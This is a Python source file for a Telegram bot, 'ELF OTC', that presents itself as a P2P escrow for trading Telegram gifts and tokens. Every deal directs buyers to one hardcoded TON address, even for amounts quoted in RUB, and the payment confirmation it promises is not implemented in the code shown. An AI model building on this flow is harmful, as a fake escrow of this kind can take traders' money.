from core.configuration.settings import app_settings

import re

from aiogram import Router, F, Bot
from aiogram.filters import CommandStart
from aiogram.types import Message, CallbackQuery
from aiogram.fsm.context import FSMContext
from sqlalchemy.ext.asyncio import AsyncSession


from keyboards.main_keyboard.main_keyboard import welcome_button
from keyboards.receipt_keyboard.receipt_keyboard import receipt_button
from states.wallet_state.wallet_state import WalletReg

from requests.users_requests.users import UsersRequests
from requests.receipts_requests.receipts import ReceiptsRequests



router = Router()

bot = Bot(token=app_settings.TOKEN)




@router.message(CommandStart())
async def cmd_start(
    message: Message,
    session: AsyncSession
) -> str:

    user_now = UsersRequests(
        message.from_user.id,
        message.from_user.username,
        session
    )

    new_user = await user_now.set_user()


    id_url = message.text.split()
    if len(id_url) > 1:

        deal_id = id_url[1]
        
        new_receipt = ReceiptsRequests(
            id_receipt=deal_id,
            buyer=message.from_user.id,
            session=session
        )

        updt_buyer_info = await new_receipt.update_buyer_info()

        this_receipt = await new_receipt.get_receipt()

        if this_receipt:
            
            if this_receipt.user.id == new_user.id:
                await bot.delete_message(
                    chat_id=message.chat.id, 
                    message_id=message.message_id
                    )
                return await message.answer('❌ Вы не можете участвовать в своей же сделке.')

        if this_receipt and this_receipt.user.card == 'RU':
            
            await bot.send_message(chat_id=this_receipt.user.telegram_id, text=f"""
Пользователь @{message.from_user.username} ({message.from_user.id}) присоединился к сделке #{this_receipt.id_receipt}
• Успешные сделки: {this_receipt.user.successful_transaction}
⚠️ Проверьте, что это тот же пользователь, с которым вы вели диалог ранее!

Не переводите подарок до получения подтверждения оплаты в этом чате!""")

            return await message.answer(f"""
💳 <b>Информация о сделке</b> #{this_receipt.id_receipt}

👤 <b>Вы покупатель</b> в сделке.
📌 Продавец: <b>@{this_receipt.user.username}</b> ({this_receipt.user.telegram_id})
• Успешные сделки: {this_receipt.user.successful_transaction}

• Вы покупаете: {this_receipt.tovar}

🏦 <b>Адрес для оплаты:</b>
UQDIMoxS4xmLihI9AxhG28QpAxupZQzzaHwAYBzrdvc2b2ah

💰 <b>Сумма к оплате:</b>
🇷🇺 {this_receipt.price} RUB

📝 <b>Комментарий к платежу(мемо):</b> <code>{this_receipt.id_receipt}</code>

⚠️ <b>Пожалуйста, убедитесь в правильности данных перед оплатой. Комментарий(мемо) обязателен!</b>

После оплаты ожидайте автоматического подтверждения
""", parse_mode="HTML")

        if this_receipt and this_receipt.user.card == 'TON':
            
            await bot.send_message(chat_id=this_receipt.user.telegram_id, text=f"""
Пользователь @{message.from_user.username} ({message.from_user.id}) присоединился к сделке #{this_receipt.id_receipt}
• Успешные сделки: {this_receipt.user.successful_transaction}
⚠️ Проверьте, что это тот же пользователь, с которым вы вели диалог ранее!

Не переводите подарок до получения подтверждения оплаты в этом чате!""")

            return await message.answer(f"""
💳 <b>Информация о сделке</b> #{this_receipt.id_receipt}

👤 <b>Вы покупатель</b> в сделке.
📌 Продавец: <b>@{this_receipt.user.username}</b> ({this_receipt.user.telegram_id})
• Успешные сделки: {this_receipt.user.successful_transaction}

• Вы покупаете: {this_receipt.tovar}

🏦 <b>Адрес для оплаты:</b>
UQDIMoxS4xmLihI9AxhG28QpAxupZQzzaHwAYBzrdvc2b2ah

💰 <b>Сумма к оплате:</b>
💎 {this_receipt.price} TON

📝 <b>Комментарий к платежу(мемо):</b> <code>{this_receipt.id_receipt}</code>

⚠️ <b>Пожалуйста, убедитесь в правильности данных перед оплатой. Комментарий(мемо) обязателен!</b>

После оплаты ожидайте автоматического подтверждения
""", parse_mode="HTML")

    return await message.answer_photo(photo='AgACAgEAAxkBAAICQWhnyjBbWnJemRLd15P-Llv4eRxqAALUrjEbdlpBR4tKeV52AiIkAQADAgADeAADNgQ',
caption="""
<b>Добро пожаловать в ELF OTC – надежный P2P-гарант</b>

💼 <b>Покупайте и продавайте всё, что угодно – безопасно!</b>
От Telegram-подарков и NFT до токенов – сделки проходят легко и без риска.

🔹 Удобное управление кошельками

📖 <b>Как пользоваться?</b>
Ознакомьтесь с инструкцией — https://telegra.ph/OTC-06-29

Выберите нужный раздел ниже:""",
reply_markup=welcome_button.inlkey,
parse_mode='HTML'
)
        



@router.callback_query(F.data == "wallet")
async def cmd_wallet(
    callback: CallbackQuery,
    state: FSMContext,
    session: AsyncSession
) -> str:
    
    await callback.answer('wallet')

    user = UsersRequests(
        callback.from_user.id,
        callback.from_user.username,
        session
    )

    this_user = await user.set_user()


    if this_user.card == '' or this_user.wallet is None:

        await state.set_state(WalletReg.card)

        await bot.delete_message(
            chat_id=callback.message.chat.id, 
            message_id=callback.message.message_id
            )
        
        return await callback.message.answer('💰 Выберите валюту.', reply_markup=welcome_button.inlkey_card)
        
    print('1')
    await state.set_state(WalletReg.address_wallet)
    
    return await callback.message.answer(f"""
💼 <b>Ваш текущий кошелек:</b> {this_user.wallet}

Отправьте новый адрес кошелька для изменения или нажмите кнопку ниже для возврата в меню.""",
reply_markup=welcome_button.wallet_inlkey,
parse_mode='HTML'
)






@router.callback_query(WalletReg.card)
async def cmd_wallet_reg_card(
    callback: CallbackQuery,
    state: FSMContext,
    session: AsyncSession
) -> str:
    
    await callback.answer()

    user = UsersRequests(
        callback.from_user.id,
        callback.from_user.username,
        session
    )

    user_wallet = await user.get_user_wallet()

    if callback.data == 'back':

        await state.clear()

        await bot.delete_message(
                chat_id=callback.message.chat.id, 
                message_id=callback.message.message_id
                )
        
        return await callback.message.answer_photo(photo='AgACAgEAAxkBAAICQWhnyjBbWnJemRLd15P-Llv4eRxqAALUrjEbdlpBR4tKeV52AiIkAQADAgADeAADNgQ',
caption="""
<b>Добро пожаловать в ELF OTC – надежный P2P-гарант</b>

💼 <b>Покупайте и продавайте всё, что угодно – безопасно!</b>
От Telegram-подарков и NFT до токенов и фиата – сделки проходят легко и без риска.

🔹 Удобное управление кошельками

📖 <b>Как пользоваться?</b>
Ознакомьтесь с инструкцией — https://telegra.ph/OTC-06-29

Выберите нужный раздел ниже:""",

reply_markup=welcome_button.inlkey,
parse_mode='HTML')


    if user_wallet is None:

        if callback.data == 'RUS':

            await state.update_data(
                card = 'RU'
            )

            data = await state.get_data()

            new_card = await user.set_user_card(data['card'])

            await state.set_state(WalletReg.address_wallet)
            await bot.delete_message(
                chat_id=callback.message.chat.id, 
                message_id=callback.message.message_id
                )

            return await callback.message.answer_photo(photo='AgACAgEAAxkBAAICQWhnyjBbWnJemRLd15P-Llv4eRxqAALUrjEbdlpBR4tKeV52AiIkAQADAgADeAADNgQ',
caption="""
🔑 <b>Добавьте ваш RU-кошелек:</b>

Пожалуйста, отправьте адрес вашего кошелька.
""",
reply_markup=welcome_button.wallet_inlkey,
parse_mode='HTML'
)

    if user_wallet is None:

        if callback.data == 'TONS':

            await state.update_data(
                card = 'TON'
            )

            data = await state.get_data()

            new_card = await user.set_user_card(data['card'])

            await state.set_state(WalletReg.address_wallet)
            await bot.delete_message(
                chat_id=callback.message.chat.id, 
                message_id=callback.message.message_id
                )

            return await callback.message.answer_photo(photo='AgACAgEAAxkBAAICQWhnyjBbWnJemRLd15P-Llv4eRxqAALUrjEbdlpBR4tKeV52AiIkAQADAgADeAADNgQ',
caption="""
🔑 <b>Добавьте ваш TON-кошелек:</b>

Пожалуйста, отправьте адрес вашего кошелька.
""",
reply_markup=welcome_button.wallet_inlkey,
parse_mode='HTML'
)
    
    await state.set_state(WalletReg.address_wallet)

    await bot.delete_message(
            chat_id=callback.message.chat.id, 
            message_id=callback.message.message_id
            )
    
    return await callback.message.answer(f"""
💼 <b>Ваш текущий {user.card}-кошелек:</b> {user_wallet}

Отправьте новый адрес кошелька для изменения или нажмите кнопку ниже для возврата в меню.""",
reply_markup=welcome_button.wallet_inlkey,
parse_mode='HTML'
)
    



@router.message(WalletReg.address_wallet)
async def set_new_wallet_address(
    message: Message,
    state: FSMContext,
    session: AsyncSession
):

    user = UsersRequests(
        message.from_user.id, 
        message.from_user.username, 
        session
        )

    new_user = await user.set_user()

    if re.fullmatch(r'[A-Za-z0-9]+', message.text) and len(message.text) == 48 or re.fullmatch(r'[0-9]+', message.text) and len(message.text) == 16:

        await state.update_data(
            address_wallet = message.text
            )

        data = await state.get_data()

        new_wallet = await user.set_user_wallet(data['address_wallet'])

        await state.clear()

        await bot.delete_message(
            chat_id=message.chat.id, 
            message_id=message.message_id-1
            )
        await message.delete()
        await message.answer_photo(photo='AgACAgEAAxkBAAICQWhnyjBbWnJemRLd15P-Llv4eRxqAALUrjEbdlpBR4tKeV52AiIkAQADAgADeAADNgQ', caption=f"""
💼 <b>Ваш текущий {new_user.card}-кошелек:</b> {new_wallet}

Отправьте новый адрес кошелька для изменения или нажмите кнопку ниже для возврата в меню.""",
reply_markup=welcome_button.wallet_inlkey,
parse_mode='HTML'
)

        await state.set_state(WalletReg.address_wallet)
        return

    return await message.answer('❌ Вы ввели некорректные данные! Попробуйте снова.')




@router.callback_query(F.data=='back')
async def cmd_back(
    callback: CallbackQuery,
    state: FSMContext    
) -> str:
    await callback.answer('back')
    await bot.delete_message(
            chat_id=callback.message.chat.id, 
            message_id=callback.message.message_id
            )
    return await callback.message.answer_photo(photo='AgACAgEAAxkBAAICQWhnyjBbWnJemRLd15P-Llv4eRxqAALUrjEbdlpBR4tKeV52AiIkAQADAgADeAADNgQ',
caption="""
<b>Добро пожаловать в ELF OTC – надежный P2P-гарант</b>

💼 <b>Покупайте и продавайте всё, что угодно – безопасно!</b>
От Telegram-подарков и NFT до токенов и фиата – сделки проходят легко и без риска.

🔹 Удобное управление кошельками

📖 <b>Как пользоваться?</b>
Ознакомьтесь с инструкцией — https://telegra.ph/OTC-06-29

Выберите нужный раздел ниже:""",

reply_markup=welcome_button.inlkey,
parse_mode='HTML')

